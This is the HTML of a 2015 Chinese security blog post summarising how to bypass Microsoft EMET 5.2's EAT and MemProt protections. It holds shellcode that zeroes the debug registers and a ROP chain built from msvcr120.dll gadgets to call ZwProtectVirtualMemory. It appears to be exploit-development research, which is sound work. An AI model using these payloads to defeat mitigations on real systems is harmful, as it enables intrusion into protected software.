@@ -1,0 +1,297 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>绕过最新版 EMET 5.2 保护摘要 | riusksk&#39;s blog</title>
+  <meta name="author" content="riusksk" />
+
+  
+  <meta name="description" content="绕过EMET 5.2 EAT保护：【保护原理】分别对ntdll、kernel32和kernelbase的EAT基址下断点，断点地址记录在调试寄存器dr0、dr1、dr2、dr3上，dr6保存最新调试异常的状态信息，dr7包含4个断点的设置，当利用漏洞去调用EAT时就会触发中断。
+开启EAT保护前：
+" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="绕过最新版 EMET 5.2 保护摘要" />
+  <meta property="og:site_name" content="riusksk&#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="undefined" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="riusksk&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-78773323-1', 'auto');
+	ga('send', 'pageview');
+
+</script>
+
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">riusksk&#39;s blog</a></h1>
+  <h2><a href="/">攀蟾折桂摄寰宇，摘星揽月御乾坤。踏云踩雾骋宵壤，驱风逐日闯天地。 ------泉哥</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">主页</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/atom.xml">RSS订阅</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2015-06-03T16:00:00.000Z"><a href="/2015/06/04/绕过最新版-EMET-5-2-保护摘要/">2015-06-04</a></time>
+      
+      
+  
+    <h1 class="title">绕过最新版 EMET 5.2 保护摘要</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="绕过EMET-5-2-EAT保护："><a href="#绕过EMET-5-2-EAT保护：" class="headerlink" title="绕过EMET 5.2 EAT保护："></a>绕过EMET 5.2 EAT保护：</h3><h4 id="【保护原理】"><a href="#【保护原理】" class="headerlink" title="【保护原理】"></a>【保护原理】</h4><p>分别对ntdll、kernel32和kernelbase的EAT基址下断点，断点地址记录在调试寄存器dr0、dr1、dr2、dr3上，dr6保存最新调试异常的状态信息，dr7包含4个断点的设置，当利用漏洞去调用EAT时就会触发中断。</p>
+<p>开启EAT保护前：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; rM 20</span><br><span class="line">dr0=00000000 dr1=00000000 dr2=00000000</span><br><span class="line">dr3=00000000 dr6=00000000 dr7=00000000</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">76f3103b cc              int     3</span><br></pre></td></tr></table></figure>
+<p>开启EAT保护后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; rM 20</span><br><span class="line">dr0=76ea0204 dr1=7645ff8c dr2=7628b85c</span><br><span class="line">dr3=00000000 dr6=ffff0ff2 dr7=0fff0115</span><br><span class="line">ntdll!LdrpSnapThunk+0x1c1:</span><br><span class="line">76ec01ae 03c2            add     eax,edx</span><br></pre></td></tr></table></figure>
+<h4 id="【绕过方法】"><a href="#【绕过方法】" class="headerlink" title="【绕过方法】"></a>【绕过方法】</h4><p>通过构造异常触发，来构造寄存器上下文，防止后面因dr寄存器清空也触发异常。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, <span class="number">150</span>h     ; 指向服务号，防止异常处理失效</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">sub     esp, <span class="number">2</span>cch                       ; makes space <span class="keyword">for</span> CONTEXT</span><br><span class="line">mov     dword ptr [esp], <span class="number">10010</span>h         ; CONTEXT_DEBUG_REGISTERS</span><br><span class="line">mov     dword ptr [esp + <span class="number">4</span>], ecx        ; context.Dr0 = <span class="number">0</span></span><br><span class="line">mov     dword ptr [esp + <span class="number">8</span>], ecx        ; context.Dr1 = <span class="number">0</span></span><br><span class="line">mov     dword ptr [esp + <span class="number">0</span>ch], ecx      ; context.Dr2 = <span class="number">0</span></span><br><span class="line">mov     dword ptr [esp + <span class="number">10</span>h], ecx      ; context.Dr3 = <span class="number">0</span></span><br><span class="line">mov     dword ptr [esp + <span class="number">14</span>h], ecx      ; context.Dr6 = <span class="number">0</span></span><br><span class="line">mov     dword ptr [esp + <span class="number">18</span>h], ecx      ; context.Dr7 = <span class="number">0</span></span><br><span class="line">push    esp</span><br><span class="line">push    <span class="number">0</span>fffffffeh                      ; current thread</span><br><span class="line">mov     edx, esp</span><br><span class="line">call    dword ptr fs : [<span class="number">0</span>C0h]           ; this also decrements ESP by <span class="number">4</span></span><br><span class="line">add     esp, <span class="number">4</span> + <span class="number">2</span>cch + <span class="number">8</span></span><br><span class="line"> </span><br><span class="line">disable_EAF = (</span><br><span class="line">            <span class="string">"\xB8\x50\x01\x00\x00"</span> +            <span class="comment"># mov    eax,150h</span></span><br><span class="line">            <span class="string">"\x33\xC9"</span> +                        <span class="comment"># xor    ecx,ecx</span></span><br><span class="line">            <span class="string">"\x81\xEC\xCC\x02\x00\x00"</span> +        <span class="comment"># sub    esp,2CCh  ，makes space for CONTEXT</span></span><br><span class="line">            <span class="string">"\xC7\x04\x24\x10\x00\x01\x00"</span> +    <span class="comment"># mov    dword ptr [esp],10010h</span></span><br><span class="line">            <span class="string">"\x89\x4C\x24\x04"</span> +                <span class="comment"># mov    dword ptr [esp+4],ecx</span></span><br><span class="line">            <span class="string">"\x89\x4C\x24\x08"</span> +                <span class="comment"># mov    dword ptr [esp+8],ecx</span></span><br><span class="line">            <span class="string">"\x89\x4C\x24\x0C"</span> +                <span class="comment"># mov    dword ptr [esp+0Ch],ecx</span></span><br><span class="line">            <span class="string">"\x89\x4C\x24\x10"</span> +                <span class="comment"># mov    dword ptr [esp+10h],ecx</span></span><br><span class="line">            <span class="string">"\x89\x4C\x24\x14"</span> +                <span class="comment"># mov    dword ptr [esp+14h],ecx</span></span><br><span class="line">            <span class="string">"\x89\x4C\x24\x18"</span> +                <span class="comment"># mov    dword ptr [esp+18h],ecx</span></span><br><span class="line">            <span class="string">"\x54"</span> +                            <span class="comment"># push   esp</span></span><br><span class="line">            <span class="string">"\x6A\xFE"</span> +                        <span class="comment"># push   0FFFFFFFEh</span></span><br><span class="line">            <span class="string">"\x8B\xD4"</span> +                        <span class="comment"># mov    edx,esp</span></span><br><span class="line">            <span class="string">"\x64\xFF\x15\xC0\x00\x00\x00"</span> +    <span class="comment"># call   dword ptr fs:[0C0h]</span></span><br><span class="line">            <span class="string">"\x81\xC4\xD8\x02\x00\x00"</span>          <span class="comment"># add    esp,2D8h</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+<h3 id="绕过EMET-5-2-MemProt保护："><a href="#绕过EMET-5-2-MemProt保护：" class="headerlink" title="绕过EMET 5.2 MemProt保护："></a>绕过EMET 5.2 MemProt保护：</h3><h4 id="【保护原理】-1"><a href="#【保护原理】-1" class="headerlink" title="【保护原理】"></a>【保护原理】</h4><p>EMET对VirtualProtect和VirtuaProtectEx进行Hook，正常情况下，执行上述函数后调用ntdll!ZwProtectVirtualMemory，接着向eax=0x4d传递服务号，然后调用 call    dword ptr fs:[0C0h]，此时EDX传递5个参数（进程句柄、地址、大小、可读写执行权限、可写地址），然后继续执行下去。</p>
+<h4 id="【绕过方法】-1"><a href="#【绕过方法】-1" class="headerlink" title="【绕过方法】"></a>【绕过方法】</h4><p>旧版EMET如4.1上，可以用VirtualAlloc/VirtuAllocEx。</p>
+<p>最新版EMET 5.2上，可以用后面执行的原始代码去代替被EMET HOOK的地方，即构造ROP，使得eax=0x4d，然后通过ntdll!NtQueryInformationThread中的call dword ptr fs:[0c0h]指令去执行。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">     msvcr120 = <span class="number">0x73c60000</span>  <span class="comment"># 固定基址，无ASLR保护模块msvcr</span></span><br><span class="line"></span><br><span class="line">     <span class="comment"># Delta used to fix the addresses based on the new base address of msvcr120.dll.</span></span><br><span class="line">     md = msvcr120 - <span class="number">0x70480000</span> <span class="comment"># 0x37E0000</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment"># EAX = ntdll!RtlExitUserThread</span></span><br><span class="line">    md + <span class="number">0x7053b8fb</span>, <span class="comment"># POP EAX # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x7056507c</span>, <span class="comment"># IAT: &amp;ntdll!RtlExitUserThread</span></span><br><span class="line">    md + <span class="number">0x70501e19</span>, <span class="comment"># MOV EAX,DWORD PTR [EAX] # POP ESI # POP EBP # RETN ** [MSVCR120.dll] ** | asciiprint,ascii &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    <span class="number">0x11111111</span>,</span><br><span class="line">    <span class="number">0x11111111</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># EAX = ntdll!NtQueryInformationThread</span></span><br><span class="line">    md + <span class="number">0x7049178a</span>, <span class="comment"># ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x7049178a</span>, <span class="comment"># ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x7049178a</span>, <span class="comment"># ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x704a691c</span>, <span class="comment"># ADD EAX,DWORD PTR [EAX] # RETN ** [MSVCR120.dll] ** | asciiprint,ascii &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x704ecd87</span>, <span class="comment"># ADD EAX,4 # POP ESI # POP EBP # RETN 0x04 ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    <span class="number">0x11111111</span>,</span><br><span class="line">    <span class="number">0x11111111</span>,</span><br><span class="line">    md + <span class="number">0x7048f607</span>, <span class="comment"># RETN (ROP NOP) [MSVCR120.dll]</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># for RETN 0x04</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># EAX -&gt; "call dword ptr fs:[0C0h] # add esp,4 # ret 14h"</span></span><br><span class="line">    md + <span class="number">0x7049178a</span>, <span class="comment"># ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x704aa20f</span>, <span class="comment"># INC EAX # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x704aa20f</span>, <span class="comment"># INC EAX # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x704aa20f</span>, <span class="comment"># INC EAX # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># EBX -&gt; "call dword ptr fs:[0C0h] # add esp,4 # ret 14h"</span></span><br><span class="line">    md + <span class="number">0x704819e8</span>, <span class="comment"># XCHG EAX,EBX # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ECX = 0; EAX = 0x4d</span></span><br><span class="line">    md + <span class="number">0x704f2485</span>, <span class="comment"># XOR ECX,ECX # MOV EAX,ECX # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    md + <span class="number">0x7053b8fb</span>, <span class="comment"># POP EAX # RETN ** [MSVCR120.dll] ** | &#123;PAGE_EXECUTE_READ&#125;</span></span><br><span class="line">    <span class="number">0x4d</span>,</span><br><span class="line"></span><br><span class="line">    md + <span class="number">0x704c0a08</span>, <span class="comment"># JMP EBX</span></span><br><span class="line">    md + <span class="number">0x7055adf3</span>, <span class="comment"># JMP ESP</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># for RETN 0x14</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># for RETN 0x14</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># for RETN 0x14</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># for RETN 0x14</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># for RETN 0x14</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># real_code:</span></span><br><span class="line">    <span class="number">0x90901eeb</span>, <span class="comment"># jmp skip</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># args:</span></span><br><span class="line">    <span class="number">0xffffffff</span>, <span class="comment"># current process handle</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># &amp;address = ptr to address</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># &amp;size = ptr to size</span></span><br><span class="line">    <span class="number">0x40</span>,</span><br><span class="line">    md + <span class="number">0x705658f2</span>, <span class="comment"># &amp;Writable location [MSVCR120.dll]</span></span><br><span class="line">    <span class="comment"># end_args:</span></span><br><span class="line">    <span class="number">0x11111111</span>, <span class="comment"># address     code_size + 8 # size</span></span><br><span class="line">    <span class="comment"># skip:</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="/2015/06/04/绕过最新版-EMET-5-2-保护摘要/#comment" class="comment-link">评论</a>
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/技术分享/">技术分享</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/EMET/">EMET</a>, <a href="/tags/EAT/">EAT</a>, <a href="/tags/MemProt/">MemProt</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">留言</h1>
+
+  <!-- 多说评论框 start -->
+  <div class="ds-thread" data-thread-key="post-绕过最新版-EMET-5-2-保护摘要" data-title="绕过最新版 EMET 5.2 保护摘要" data-url="http://riusksk.github.io/2015/06/04/绕过最新版-EMET-5-2-保护摘要/"></div>
+  <!-- 多说评论框 end -->
+  <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:'riusksk'};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+       || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+  <!-- 多说公共JS代码 end -->
+
+</section>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:riusksk.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2016/07/23/China-Pub计算机类图书畅销榜第一/">China-Pub计算机类图书畅销榜第一</a>
+      </li>
+    
+      <li>
+        <a href="/2016/07/17/《漏洞战争：软件漏洞分析精要》勘误表/">《漏洞战争：软件漏洞分析精要》勘误表</a>
+      </li>
+    
+      <li>
+        <a href="/2016/07/12/《漏洞战争》配套资料下载/">《漏洞战争》配套资料下载</a>
+      </li>
+    
+      <li>
+        <a href="/2016/07/02/《漏洞战争：软件漏洞分析精要》已开售/">《漏洞战争：软件漏洞分析精要》已开售</a>
+      </li>
+    
+      <li>
+        <a href="/2016/06/23/ios-auditor/">浅谈iOS应用安全自动化审计</a>
+      </li>
+    
+      <li>
+        <a href="/2016/06/17/add-articles/">迁移技术文章</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/25/PHDays-2016/">PHDays安全大会议题分析</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/13/CanSecWest_2016/">CanSecWest 2016 大会议题分析</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/05/bh-asia-2016/">BlackHat Asia 2016 大会议题分析报告</a>
+      </li>
+    
+      <li>
+        <a href="/2015/06/04/绕过最新版-EMET-5-2-保护摘要/">绕过最新版 EMET 5.2 保护摘要</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/技术分享/">技术分享</a><small>25</small></li>
+  
+    <li><a href="/categories/随笔杂谈/">随笔杂谈</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/ASLR/" style="font-size: 10px;">ASLR</a> <a href="/tags/Android/" style="font-size: 16.67px;">Android</a> <a href="/tags/BlackHat/" style="font-size: 13.33px;">BlackHat</a> <a href="/tags/CanSecWest/" style="font-size: 13.33px;">CanSecWest</a> <a href="/tags/DEP/" style="font-size: 10px;">DEP</a> <a href="/tags/EAT/" style="font-size: 10px;">EAT</a> <a href="/tags/EMET/" style="font-size: 10px;">EMET</a> <a href="/tags/Flash/" style="font-size: 10px;">Flash</a> <a href="/tags/Fuzzing/" style="font-size: 10px;">Fuzzing</a> <a href="/tags/GS/" style="font-size: 10px;">GS</a> <a href="/tags/Heap-Spray/" style="font-size: 10px;">Heap Spray</a> <a href="/tags/MemProt/" style="font-size: 10px;">MemProt</a> <a href="/tags/OSX/" style="font-size: 10px;">OSX</a> <a href="/tags/PHDays/" style="font-size: 10px;">PHDays</a> <a href="/tags/Perl/" style="font-size: 10px;">Perl</a> <a href="/tags/SafeSEH/" style="font-size: 10px;">SafeSEH</a> <a href="/tags/UXSS/" style="font-size: 10px;">UXSS</a> <a href="/tags/Windows/" style="font-size: 13.33px;">Windows</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/iOS/" style="font-size: 10px;">iOS</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/书籍/" style="font-size: 20px;">书籍</a> <a href="/tags/内核/" style="font-size: 10px;">内核</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/恶意软件/" style="font-size: 13.33px;">恶意软件</a> <a href="/tags/打印机/" style="font-size: 10px;">打印机</a> <a href="/tags/溢出/" style="font-size: 10px;">溢出</a> <a href="/tags/漏洞/" style="font-size: 13.33px;">漏洞</a> <a href="/tags/监控取证/" style="font-size: 10px;">监控取证</a> <a href="/tags/编程/" style="font-size: 10px;">编程</a> <a href="/tags/虚拟机/" style="font-size: 10px;">虚拟机</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+    <h3 class="title">最新评论</h3>
+    <ul class="entry">
+        <!-- 多说最新评论 start -->
+                <div class="ds-recent-comments" data-num-items="5" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="70"></div>
+        <!-- 多说最新评论 end -->
+        <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+        <script type="text/javascript">
+        var duoshuoQuery = {short_name:"riusksk"};
+                (function() {
+                        var ds = document.createElement('script');
+                        ds.type = 'text/javascript';ds.async = true;
+                        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+                        ds.charset = 'UTF-8';
+                        (document.getElementsByTagName('head')[0] 
+                         || document.getElementsByTagName('body')[0]).appendChild(ds);
+                })();
+                </script>
+        <!-- 多说公共JS代码 end -->
+    </ul>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2016 riusksk
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+  & Hosted by <a href="http://github.com" target="_blank">GitHub</a>
+  <!--<span id="busuanzi_container_site_pv" >
+    ，本站总访问量<span id="busuanzi_value_site_pv" ></span>次
+  </span>
+  -->
+  </p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+</footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
